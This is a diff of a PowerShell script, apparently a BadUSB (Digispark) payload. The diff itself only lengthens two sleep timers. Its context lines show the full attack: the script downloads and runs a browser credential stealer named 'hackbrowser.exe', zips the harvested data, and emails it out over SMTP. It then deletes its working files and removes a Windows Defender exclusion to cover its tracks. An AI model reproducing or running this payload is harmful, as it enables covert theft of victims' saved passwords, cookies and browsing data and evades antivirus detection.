@@ -6,7 +6,7 @@ Set-Location "$env:appdata\dump"
 #Downloading and executing hackbrowser.exe
 Invoke-WebRequest -Uri "https://github.com/Bxy777/digispark/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
 ./hb.exe
-Start-Sleep -Seconds 6
+Start-Sleep -Seconds 10
 Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
@@ -28,7 +28,7 @@ $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
-Start-Sleep -Seconds 6
+Start-Sleep -Seconds 10
 cd "$env:appdata"
 Remove-Item -Path "$env:appdata\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
